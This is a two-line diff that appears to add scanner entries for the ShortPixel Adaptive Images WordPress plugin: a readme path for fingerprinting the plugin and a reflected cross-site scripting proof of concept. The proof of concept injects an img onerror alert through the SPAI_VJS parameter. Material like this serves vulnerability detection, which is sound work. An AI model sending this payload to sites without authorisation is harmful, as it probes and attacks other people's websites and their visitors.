@@ -1,0 +1,2 @@
+/wp-content/plugins/shortpixel-adaptive-images/readme.txt
+/?SPAI_VJS=%3C/script%3E%3Cimg%20src%3D1%20onerror%3Dalert(document.domain)%3E
